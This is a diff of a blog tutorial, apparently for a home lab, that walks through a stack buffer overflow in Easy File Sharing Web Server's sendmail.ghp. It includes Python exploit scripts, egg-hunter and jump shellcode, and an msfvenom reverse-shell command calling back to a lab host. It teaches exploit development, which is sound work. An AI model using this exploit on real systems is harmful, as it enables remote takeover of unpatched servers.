@@ -2,44 +2,42 @@
 
 <p>So, to recap: We have fuzzed the Easy file sharing Web server  by creating a custom fuzzing template for SPIKE. This resulted in the “discovery” of a nice buffer overflow present in the sendmail.ghp service,
 accessible publicly without any authentication. After fuzzing and playing with the buffer length, we found the buffer overflow can be triggered by posting a sequence of 4144 A’s. 
-From this we created a skeleton PoC that is enough to crash  and cause a DoS in the application, but what fun is that? ;)</p>
+From this we created a skeleton PoC that is enough to crash  and cause a DoS in the application, but what fun is that?</p>
 
 <p>Lets attach the Easy file server to immunity and take a look at the registers during normal execution. Run the EFS.exe program, then attach it to immunity by navigating to file &gt; attach and selecting the 
 EFS process from the list. Then click attached.</p>
 
-<p>Once attached the program execution will be paused. To resume, click on the Play button in immunity’s toolbar. at this point lets take a look at the registers and memory. Mine looks as follows:</p>
+<p>Once attached, the program execution will be paused. To resume, click on the play button in immunity’s toolbar. At this point lets take a look at the registers and memory. Mine looks as follows:</p>
 
-<p><img src="http://localhost:4000/images/Stack/Overview.png" alt="Immunity Overview" />
-{image of immunity running normally}</p>
+<p><img src="http://localhost:4000/images/Stack/Overview.png" alt="Immunity Overview" /></p>
 
-<p>So whats going on here? dont let the debugger intimidate you, for now lets look at the basics. The top left (1) is the dissassembly window and it shows us the processor instructions. When a program is compiled,
-the compiler turns our C code into machine readable instructions. Our code is turned into a sequence of simple instructions that manipulate the registers (x86 in this case)  of the CPU. These instructions are
+<p>So whats going on here? dont let the debugger intimidate you, for now lets look at the basics. The top left is the dissassembly window and it shows us the processor instructions. When a program is compiled,
+the compiler turns our C code into machine readable instructions. Our code is turned into a sequence of simple instructions that manipulate the registers of the CPU. These instructions are
 called Opcodes, and what we see in the dissassembly view is the hex representation of these instructions.</p>
 
-<p>To the right of the Dissassembly view we have a view of the CPU registers (2). For now, we will be interested in the general purpose registers, specifically the stack pointer (ESP), the Base pointer (EBP) and the
+<p>To the right of the dissassembly view we have a view of the CPU registers. For now, we will be interested in the general purpose registers, specifically the stack pointer (ESP), the Base pointer (EBP) and the
 instruction pointer (EIP). Generally when a function is called, a new stack frame is located at the current ESP location. The value of ESP is then moved into EBP (mov EBP, ESP) so that EBP = ESP. 
 When parameters are passed to the function they are pushed onto the stack. Since the stack pointer always points to the top of the stack, pushing onto the stack causes ESP to grow towards a more 
 negative address while the base pointer remains unmodified. This allows the program to refer to local function variables passed to the function as offsets of the base pointer. 
-The EIP register is the most important register in exploit development. You can think of the instruction pointer like a finger that moves along a page you are reading. The EIP holds the address of the instruction
+The EIP register is the most important register in exploit development. The instruction pointer acts like a finger that moves along a page you are reading. The EIP holds the address of the instruction
 currently being executed by the CPU. Therefore, if we are able to take control of this register we could theoretically redirect the program’s execution flow to a part in memory. Now what if we could also
 place our own code in memory?</p>
 
-<p>Below the register view we have our Stack view (3). ESP will always sit at top of the stack. Here we can see the status of our current stack, as well as previously called functions that remain on the stack.
-The stack can be modified by push/pop isntructions. For Example, a  PUSH EAX  instruction will push the 4 bytes stored in EAXe onto the stack (and cause the stack to grow by 4 bytes) while a POP EAX instruction will 
+<p>Below the register view we have our Stack view. ESP will always sit at top of the stack. Here we can see the status of our current stack, as well as previously called functions that remain on the stack.
+The stack can be modified by push/pop instructions. For Example, a  PUSH EAX  instruction will push the 4 bytes stored in EAX onto the stack (and cause the stack to grow by 4 bytes) while a POP EAX instruction will 
 remove the last 4 bytes from the stack and “pop” them into EAX, therefore setting EAX’s value to this.</p>
 
-<p>Lastly, below the dissassembly view we have the dump view (4). The dump view will show us the hex view of the instructions at a specified address. For example, if we right click on ESP and select follow in dump
+<p>Lastly, below the dissassembly view we have the dump view. The dump view will show us the hex view of the instructions at a specified address. For example, if we right click on ESP and select follow in dump
 we will be able to see the instructions located at ESP and follow them in the dump.</p>
 
 <p>Ok, with that out of the way, lets begin the fun stuff. Lets fire out PoC and see what we can learn from the debugger.</p>
 
-<p><img src="http://localhost:4000/images/Stack/Crash.png" alt="Nothing to see here, just a crash" />
-{image of crashed immunity}</p>
+<p><img src="http://localhost:4000/images/Stack/Crash.png" alt="Nothing to see here, just a crash" /></p>
 
-<p>Our application crashed with an Access violation error. Lets take a look at the registers, specifically EIP. See something interesting? EIP has been overwritten by 41’s! Turns out that 
-\x41 is the hex representation of our ascii A. We have just overflowed the buffer which has caused us to overwrite the instruction pointer. If you recall, the EIP is in charge of telling the program
-what instruction to execute next. In this case  the program crashed as it can not interpret any instructions located at 0x41414141. But what if we supplied a valid address? preferably with our own set of
-instructions? lets keep looking and see what else we can learn from the crash.</p>
+<p>Our application crashed with an Access violation error. Lets take a look at the registers, specifically EIP. See something interesting? EIP has been overwritten by 41’s! Turns out that
+<code class="highlighter-rouge">\x41</code> is the hex representation of our ASCII A. We have just overflowed the buffer which has caused us to overwrite the instruction pointer. If you recall, the EIP is in charge of telling the program
+what instruction to execute next. In this case  the program crashed as it can not interpret any instructions located at <code class="highlighter-rouge">0x41414141</code>. But what if we supplied a valid address? Preferably with our own set of
+instructions? Lets keep looking and see what else we can learn from the crash.</p>
 
 <p>If we look at the stack pointer, we can see that we have also overwritten the memory pointed at by the stack pointer. If we take a close look, we realize that we have 56 bytes we control at ESP. While this is
 enough to get creative and write some shellcode, that is a topic for another post. Lets keep looking and seeing what else we have. If we scroll up the stack, we can see we have a much larger buffer right
@@ -48,81 +46,36 @@ before ESP! This buffer certainly looks big enough to hold just about any code w
 <p>The easiest way to exploit this will be to use a multi stage payload. Essentially, we will use a small chunk of code at ESP that is smaller than 56 bytes to jump to our largely controlled buffer where
 we can execute any payload we want.</p>
 
-<p>So, here is what we need to do:
-1) Verify control of EIP
-2) Redirect execution flow to ESP
-3) Use a small first stage payload to redirect execution into our big buffer
-4) Choose second stage payload
-5) r00t dance.</p>
+<p>So, here is what we need to do:</p>
 
-<p>1) Verify control of EIP</p>
+<ol>
+  <li>Bad Char Check</li>
+  <li>Verify control of EIP</li>
+  <li>Redirect execution flow to ESP</li>
+  <li>Use a small first stage payload to redirect execution into our big buffer</li>
+  <li>Choose second stage payload</li>
+  <li>R00t dance.</li>
+</ol>
 
-<p>Ok, so now that we have the game plan, how do we execute it? First, we need to confirm we have control of the EIP. We have seen we overwrote EIP with A’s. But we have also sent 4144 A’s. Any of which could
-be the ones that overwrote our EIP. To help us identify the exact offset, we are going to use metasploit’s pattern create. Basically, this will create a unique string of 4144 bytes in length. We can then
-replace our payload with this string, and use metasploit’s pattern offset to identify the exact offset of our EIP.</p>
+<p>1) Bad Char Check</p>
 
-<p>To generate a string, use the following command:</p>
+<p>Ok, so now that we have the game plan, how do we execute it? First, we need to check for bad chars.</p>
 
-<p><code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4144</code></p>
+<p>Sometimes you will find that there are certain characters that will either mutate or truncate your payloads. Finding these characters at the beginning stages of exploit
+development will save us a lot of time when troubleshooting why a 400 byte payload isnt working. The most common of these characters is the null byte, or <code class="highlighter-rouge">x00</code>. Consider the following 2 lines:</p>
 
-<p>Now copy and paste the output into our exploit, replacing the A’s.</p>
-
-<p>Restart the EFS server and launch the exploit once again. You should see the following:</p>
-
-<p><img src="http://localhost:4000/images/Stack/Offset.png" alt="Offset, there you are." />
-{Image of offset in EIP}</p>
-
-<p>We see EIP is now overwritten with 66463766. To determine the offset, we will use the following command:</p>
-
-<p><code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4144 -q 66463766</code></p>
-
-<p>Which tells us the offset is 4072. Lets verify this in our exploit. Replace the payload string with 4072 instances of A plus four instances of B and fill the remainder with C’s. Our exploit should
-look like the following:</p>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python</span>
-
-<span class="n">import</span> <span class="n">socket</span>
-<span class="n">import</span> <span class="n">sys</span>
-
-<span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="nf">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
-        <span class="nb">print</span> <span class="s2">"Usage: python EFS.py [IP]</span><span class="se">\n</span><span class="s2">"</span>
-        <span class="nb">print</span> <span class="s2">"i.e python  EFS.py 192.168.56.101</span><span class="se">\n</span><span class="s2">"</span>
-        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-
-<span class="n">crash</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">4072</span><span class="o">+</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="s2">"C"</span><span class="o">*</span><span class="p">(</span><span class="mi">4144</span><span class="o">-</span><span class="mi">4076</span><span class="p">)</span>
-
-<span class="n">buffer</span>  <span class="o">=</span><span class="s2">"POST /sendmail.ghp HTTP/1.1 </span><span class="se">\r\n</span><span class="s2">"</span> 
-<span class="n">buffer</span> <span class="o">+=</span><span class="s2">"Email="</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">"&amp;getPassword=Get+Password"</span>
-
-<span class="no">EFS</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="no">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="no">SOCK_STREAM</span><span class="p">)</span>
-<span class="no">EFS</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">sys</span><span class="p">.</span><span class="nf">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">80</span><span class="p">))</span>
-<span class="no">EFS</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
-<span class="no">EFS</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p>Lets restart the server, attach it to immunity and fire off our exploit. Bingo! EIP has been overwritten with B’s. We now have the Offset for EIP, time to redirect execution flow.</p>
-
-<p>2) Redirect Execution flow to ESP</p>
-
-<p>Now that we have control of EIP we need to redirect exection flow. This will always depend on the program being exploited, the buffers available and the state of the registers. Unfortunately not all
-overflows are exploitable, so keep this in mind when working on other exploits. For this particular exploit, we notice that we have control of the buffer at ESP, so it makes sence to redirect execution flow
-here. The way we will do this is by finding the address of a “JMP ESP” or “CALL ESP” instruction, which will tell the program to go to the address of ESP for the next isntruction. Before we do this
-it is always good practice to check for bad characters.</p>
-
-<p>Sometimes you will find that there are certain characters that will either mutate or truncate your payloads. Finding these characters at the beginning stages of exploit 
-development will save us a lot of time when troubleshooting why a 400 byte payload isnt working. The most common of these characters is the null byte, or x00. Consider the following 2 lines:</p>
 <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
 <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 </code></pre></div></div>
-<p>Here we are declaring a 30 byte buffer to hold some chars, and the strcpy function is passing a user supplied argument into this buffer without any form of size checks. Basically, the function will copy all 
-the user supplied data until a null byte is encountered, which marks the end of the input string. A buffer overflow occurs when an argument larger than the allocated buffer is supplied. 
-This also explains why having a null bytein your code can mess thigns up, as this character is what marks the end of the supplied string, having it in your payload (or EIP address) will truncate our 
+
+<p>Here we are declaring a 30 byte buffer to hold some chars, and the strcpy function is passing a user supplied argument into this buffer without any form of size checks. Basically, the function will copy all
+the user supplied data until a null byte is encountered, which marks the end of the input string. A buffer overflow occurs when an argument larger than the allocated buffer is supplied.
+This also explains why having a null byte in your code can mess things up. This character is what marks the end of the supplied string, so having it in your payload (or EIP address) can truncate our
 payload and therefore crash the target.</p>
 
-<p>The most straightforward way to check for payloads is to send a buffer from x01 to xff, then inspecting the memory to see if all our characters made it onto the stack.</p>
+<p>The most straightforward way to check for bad characters is to send a buffer from <code class="highlighter-rouge">x01</code> to <code class="highlighter-rouge">xff</code>, then inspecting memory to see if all our characters made it onto the stack.</p>
 
-<p>Modify out Poc to look like below:</p>
+<p>Modify our PoC to look like below:</p>
 
 <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python</span>
 
@@ -156,6 +109,55 @@ payload and therefore crash the target.</p>
 <span class="p">)</span>
 
 <span class="n">crash</span> <span class="o">=</span> <span class="no">BadChar</span> <span class="o">+</span> <span class="s2">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">4072</span><span class="o">-</span><span class="n">len</span><span class="p">(</span><span class="no">BadChar</span><span class="p">))</span><span class="o">+</span><span class="no">EIP</span><span class="o">+</span><span class="s2">"C"</span><span class="o">*</span><span class="p">(</span><span class="mi">4144</span><span class="o">-</span><span class="mi">4076</span><span class="p">)</span>
+<span class="n">buffer</span>  <span class="o">=</span><span class="s2">"POST /sendmail.ghp HTTP/1.1 </span><span class="se">\r\n</span><span class="s2">"</span>
+<span class="n">buffer</span> <span class="o">+=</span><span class="s2">"Email="</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">"&amp;getPassword=Get+Password"</span>
+
+<span class="no">EFS</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="no">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="no">SOCK_STREAM</span><span class="p">)</span>
+<span class="no">EFS</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">sys</span><span class="p">.</span><span class="nf">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">80</span><span class="p">))</span>
+<span class="no">EFS</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+<span class="no">EFS</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p>When we run it, our application crashes, and immediately we can see that our EIP contains <code class="highlighter-rouge">\x43\x43\x42\x42</code>. Seeing as the payload lengths are the same, we can already see some characters got mangled in the stack.
+If we examine the stack we can see that <code class="highlighter-rouge">\x25\x26\x27\x2b</code> where either ommitted or replaced by another character. Lets take these out of our bad char buffer and send the payload again.</p>
+
+<p>Great, examining our buffer we see that once again our EIP is overwritten with B’s and our stack contains all the characters sent.</p>
+
+<p>2) Verify Control of EIP</p>
+
+<p>Back to the original exploit, We have seen we overwrote EIP with A’s, But we have also sent 4144 A’s, Any of which could
+be the ones that overwrote our instruction pointer. To help us identify the exact offset, we are going to use metasploit’s pattern create. Basically, this will create a unique string of 4144 bytes in length. We can then
+replace our payload with this string, and use metasploit’s pattern offset to identify the exact offset of our EIP.</p>
+
+<p>To generate a string, use the following command:</p>
+
+<p><code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4144</code></p>
+
+<p>Now copy and paste the output into our exploit, replacing the A’s.</p>
+
+<p>Restart the EFS server and launch the exploit once again. You should see the following:</p>
+
+<p><img src="http://localhost:4000/images/Stack/Offset.png" alt="Offset, there you are." /></p>
+
+<p>We see EIP is now overwritten with <code class="highlighter-rouge">66463766</code>. To determine the offset, we will use the following command:</p>
+
+<p><code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4144 -q 66463766</code></p>
+
+<p>Which tells us the offset is 4072. Lets verify this in our exploit. Replace the payload string with 4072 instances of A plus four instances of B and fill the remainder with C’s. Our exploit should
+look like the following:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python</span>
+
+<span class="n">import</span> <span class="n">socket</span>
+<span class="n">import</span> <span class="n">sys</span>
+
+<span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="nf">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">"Usage: python EFS.py [IP]</span><span class="se">\n</span><span class="s2">"</span>
+        <span class="nb">print</span> <span class="s2">"i.e python  EFS.py 192.168.56.101</span><span class="se">\n</span><span class="s2">"</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="n">crash</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">4072</span><span class="o">+</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="s2">"C"</span><span class="o">*</span><span class="p">(</span><span class="mi">4144</span><span class="o">-</span><span class="mi">4076</span><span class="p">)</span>
+
 <span class="n">buffer</span>  <span class="o">=</span><span class="s2">"POST /sendmail.ghp HTTP/1.1 </span><span class="se">\r\n</span><span class="s2">"</span> 
 <span class="n">buffer</span> <span class="o">+=</span><span class="s2">"Email="</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">"&amp;getPassword=Get+Password"</span>
 
@@ -165,22 +167,23 @@ payload and therefore crash the target.</p>
 <span class="no">EFS</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>When we run it, Our application crashes, and immediately we can see that our EIP contains \x43\x43\x42\x42. Seeing as the payload lengths are the same, we can already see some characters got mangled in the stack
-If we examine the stack we can see that \x25\x26\x27\x2b where either ommitted or replaced by another character. Lets take these out of our bad char buffer and send the payload again.</p>
+<p>Lets restart the server, attach it to immunity and fire off our exploit. Bingo! EIP has been overwritten with B’s. We now have the Offset for EIP, time to redirect execution flow.</p>
 
-<p>Great, examining our buffer we see that once again our EIP is overwritten with B’s and our stack cotnains all the characters sent.</p>
+<p>3) Redirect Execution flow to ESP</p>
 
-<p>With that out of the way, it is time to redirect execution flow to ESP. The way we do this is by giving an EIP the address of an instruction that will tell it to go to ESP for the next instruction.
-Three ways we can accomplish this is by finding the address of a JMP ESP, CALL ESP or PUSH ESP,RET. The JMP and the CALL work pretty much as the name suggests; JMP will completely redirect execution
+<p>Now that we have control of EIP we need to redirect exection flow. This will always depend on the program being exploited, the buffers available and the state of the registers. Unfortunately not all
+overflows are exploitable, so keep this in mind when working on other exploits. For this particular exploit, we notice that we have control of the buffer at ESP, so it makes sence to redirect execution flow
+there. The way we will do this is by finding the address of a “JMP ESP” or “CALL ESP” instruction, which will tell the program to go to the address of ESP for the next instruction.</p>
+
+<p>Three ways we can accomplish this is by finding the address of a JMP ESP, CALL ESP or PUSH ESP,RET. The JMP and the CALL work pretty much as the name suggests; JMP will completely redirect execution
 to ESP, while CALL pushes the address of the EIP onto the stack and redirects execution to ESP. Upon encountering a RET instruction, it will go back to the spot before the jump.
-PUSH ESP, RET is a little different. The PUSH ESP will push the address of ESP onto the stack, while the ret will load this value into EIP and redirect execution flow there.</p>
+PUSH ESP, RET is a little different. The PUSH ESP will push the address of ESP onto the stack, while the RET will load this value into EIP and redirect execution flow there.</p>
 
 <p>To find an address we can use, we will use Corelan’s excellent mona script for immunity. In the command box at the bottom of the debugger, we will use the following command:</p>
 
 <p><code class="highlighter-rouge">!mona jmp -r esp</code></p>
 
-<p><img src="http://localhost:4000/images/Stack/Mona.png" alt="Corelan's Mona - your new best friend" />
-{image of above command and results}</p>
+<p><img src="http://localhost:4000/images/Stack/Mona.png" alt="Corelan's Mona - your new best friend" /></p>
 
 <p>Mona will not only go through the loaded modules and supply some addresses we can use, but it will also show us what memory protections are enabled in each module. For the purposes of this blog post
 we will choose a return address from a DLL with no memory protections (we will cover these a little later). The last address presented has no memory protections enabled, is from one of the server’s dll’s,
@@ -213,27 +216,27 @@ and offers an address free of bad chars. Modify our skeleton exploit to look lik
 x86 is little endian, which refers to the order in which the bytes are stored in memory. In little endian architechture, the least significant value (in this case 3b) is stored first. We will explore this a 
 little more in the shellcode section of the blog.</p>
 
-<p>Save the above exploit, but dont run it yet. This time we are going to follow the execution flow of our payload. To do this, Lets place a breakpoint at the return address. We will do this by heading to the
+<p>Save the above exploit, but dont run it yet. This time we are going to follow the execution flow of our payload. To do this, lets place a breakpoint at the return address. We will do this by heading to the
 dissassembly window and right clicking anywhere. Select go to &gt; Expression and input our return address. When the instruction shows up right click on it and toggle a break point. This will pause the program
 once execution hits this point.</p>
 
 <p>After we run the exploit we see something interesting. Our program no longer crashes! instead, Our EIP has been overwriten which has redirected execution flow to our breakpoint, which has paused the program.</p>
 
-<p><img src="http://localhost:4000/images/Stack/Breakpoint.png" alt="So far so good." />
-{Break point image}</p>
+<p><img src="http://localhost:4000/images/Stack/Breakpoint.png" alt="So far so good." /></p>
 
 <p>Now pay close attention to the stack. If we step through our program and execute the PUSH ESP, we will see the address of ESP being pushed onto the stack. Step through it again and we now see execution redirected
 to our stack of C’s! Now, the program will execute anything we place here instead of C’s.</p>
 
-<p><img src="http://localhost:4000/images/Stack/C.png" alt="Booyaaaa" />
-{image of redirect}</p>
+<p><img src="http://localhost:4000/images/Stack/C.png" alt="Booyaaaa" /></p>
+
+<p>4) Use a small first stage payload to redirect execution into our Big buffer.</p>
 
 <p>Here is where it gets fun. We now have to choose our first stage payload. I am going to show two approaches which we will expand on in different posts.</p>
 
-<p>1.1 - The Egg Hunter</p>
+<p>4.1 - The Egg Hunter</p>
 
-<p>The first approach we will discuss is using an egg hunter. An egg hunter is a piece of shellcode which will look through memory for our marker, or egg. Once it encoutners this “Egg”, it will redirect
-execution flow here and execute it. In later posts we will go over different Egg Hunters in depth, but for now we will use metasploit to help us generate one.</p>
+<p>The first approach we will discuss is using an egg hunter. An egg hunter is a piece of shellcode which will look through memory for our marker, or egg. Once it encounters this egg, it will redirect
+execution flow here and execute it. In later posts we will go over different egg hunters in depth, but for now we will use metasploit to help us generate one.</p>
 
 <p><code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/egghunter.rb -b \x25\x26\x27\x2b -e r00t -f python</code></p>
 
@@ -275,7 +278,7 @@ our second stage payload. Please note that this needs to be four bytes.</p>
 <span class="no">EFS</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>Now lets launch the exploit. The result is very anticlimatic - Nothing happened! Our program does not crash, but it also does not look to be doing anything!
+<p>Now lets launch the exploit. The result is very anticlimatic - Nothing happened! Our program does not crash, but it also does not look to be doing anything.
 However if you open up the task manager, you will notice the CPU is running at 100% capacity. What is happening? Exactly what is supposed to be happening. Our EggHunter is looking through various pages of
 memory looking for our “Egg”, however as we have not included it anywhere it just keeps searching indefinitely.</p>
 
@@ -285,25 +288,21 @@ memory looking for our “Egg”, however as we have not included it anywhere it
 <code class="highlighter-rouge">crash = Stage2+EIP+"\x90"*16+Stage1</code></p>
 
 <p>Now, if we launch the exploit again we will see the CPU spike, but rather than running indefinitely we see our program suddenly pause. What happened?
-If we take a look at the dissassembly and register windows we will see the following:</p>
-
-<p><img src="http://localhost:4000/images/Stack/notcorrectint3-change!.png" alt="Egg found, execution redirected." />
-[dissassembly window showing r00t instructions + \xcc”]</p>
-
-<p>EIP is pointing at our \xcc which acts as INT3 breakpoint. It has hit the breakpoint which if you notice we sent before our first stage shellcode. If we pay close attention to the eight bytes preceeding
-the first INT3 instruction, we notice 7230307472303074, which is the hex equivalent of our r00tr00t signature! Our Egghunter has found the egg, and redirected execution flow to the bytes after our egg,
+If we take a look at the dissassembly and register windows we will see that EIP is pointing at our \xcc which acts as INT3 breakpoint. 
+It has hit the breakpoint which if you notice we sent before our first stage shellcode. If we pay close attention to the eight bytes preceeding
+the first INT3 instruction, we notice <code class="highlighter-rouge">7230307472303074</code>, which is the hex equivalent of our r00tr00t signature! Our Egghunter has found the egg, and redirected execution flow to the bytes after our egg,
 and executed out INT3 breakpoint which paused execution. From here on the only thing left to do is swap \xcc with some bind tcp shellcode and we will finally have access.</p>
 
 <p>Before this, lets take a look at our second option for redirecting execution</p>
 
-<p>1.2 - Writing Shellcode</p>
+<p>4.2 - Writing Shellcode</p>
 
 <p>Just as it was the case with the Egg hunter, We will cover writing shellcode much more in different posts. For now we will focus on the minimum and simplest shellcode needed
 to redirect execution flow.</p>
 
 <p>The way we are going to achieve this is to jump back into our stack. An msfvenom generated shell payload will be around 400 bytes, so if we place it right before our EIP address we will need to jump
 back around ~400 bytes. Our Stage1 payload where we will write the code is at ESP, so we will use this address as our starting point. We are going to use the accumulator register (EAX) to perform our arithmetic by 
-setting it equal to esp, substracting 400 bytes and redirecting execution flow to it. Keeping our 52 byte restriction and our bad char restriction in mind, The resulting shellcode will be:</p>
+setting it equal to ESP, substracting 400 bytes and redirecting execution flow to it. Keeping our 52 byte restriction and our bad char restriction in mind, The resulting shellcode will be:</p>
 
 <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="se">\x54\x58</span><span class="s2">"</span>     <span class="c1">#PUSH ESP, POP EAX --&gt; This sets the value of EAX to ESP by pushing the address of ESP onto the stack and popping it into EAX.</span>
 <span class="s2">"</span><span class="se">\x83\xE8\x7F</span><span class="s2">"</span> <span class="c1">#SUB EAX, 7F       --&gt; This substracts 127 bytes from EAX</span>
@@ -347,24 +346,29 @@ setting it equal to esp, substracting 400 bytes and redirecting execution flow t
 <span class="no">EFS</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>Let’s set a breakpoint and run the exploit again. As you step through it, pay attention to the EAX and ESP registers. They should look as followS:</p>
-
-<p>{img of registers and isntructions gettng executed}</p>
-
-<p>After we execute our jmp EAX, we can see that EIP was redirected to the buffer right before our shelcode. If we let it execute, we will see execion stop as soon as it reaches the INT3 is tructions we sent
+<p>Let’s set a breakpoint and run the exploit again. As you step through it, pay attention to the EAX and ESP registers.
+After we execute our jmp EAX, we can see that EIP was redirected to the buffer right before our shelcode. If we let it execute, we will see execution stop as soon as it reaches the INT3 instructions we sent
 in the shellode variable.</p>
 
-<ol>
-  <li>r00t Dance</li>
-</ol>
+<p>5) Choose second stage payload</p>
 
-<p>With execution redirected in both cases, the last step is to create a payload and swap out our shellcode.</p>
+<p>With execution redirected in both cases, the last step is to choose our second stage payload and swap out our shellcode. The payload will depend on many different things, such as our buffer size, and our 
+targets configuration.
+If we are breaching a target’s external perimieter, there will likely be a firewall in place. Opening up a port will most likely get flagged as malicious behavior, which may just crash the service and eliminate
+our chances of exploiting the target again. Even if the code executes succesfully, the port may remain blocked by a firewall at the perimeter which again would eliminate our chances of getting in.</p>
+
+<p>A reverse shell is usually prefered. However, outbound connections may still be flagged as suspicious, or could also have connections to the destination port blocked. Consider what else is available. Is SSH
+or remote desktop enabled? is the service running as a privileged user? If so, perhaps adding a user will suffice. There will be times when pre-packaged shellcode such as that generated by metasploit will not
+work, forcing us to think creatively. Before launching your exploit against a production target, consider what a failed exploit will mean to your client and to the test.
+Replicate the target as closely as possible first in a lab, and only once you are absolutely certain of your targets configuration and reliability of your exploit launch it.</p>
+
+<p>6) r00t dance</p>
 
 <p>Lets generate a reverse shell payload with msfvenom, remembering to encode the payload and define our badchars. The command I used is the following:</p>
 
 <p><code class="highlighter-rouge">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=445 -e x86/shikata_ga_nai -b \x00\x25\x26\x27\x2b -f c</code></p>
 
-<p>This resutls in a payload that is 351 bytes wich will fit in th buffer we created in our shell exploit. My finished Shell code exploitwill look like this:</p>
+<p>This resutls in a payload that is 351 bytes which will fit in the buffer we created in our shell exploit. My finished Shell code exploit will look like this:</p>
 
 <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python</span>
 
@@ -501,5 +505,5 @@ in the shellode variable.</p>
 
 <p>In both cases firing this at our development Windows 7 box results in a reverse Shell!</p>
 
-<p>{Image of Shell}</p>
+<p><img src="http://localhost:4000/images/Stack/r00t.png" alt="r00t" /></p>
 
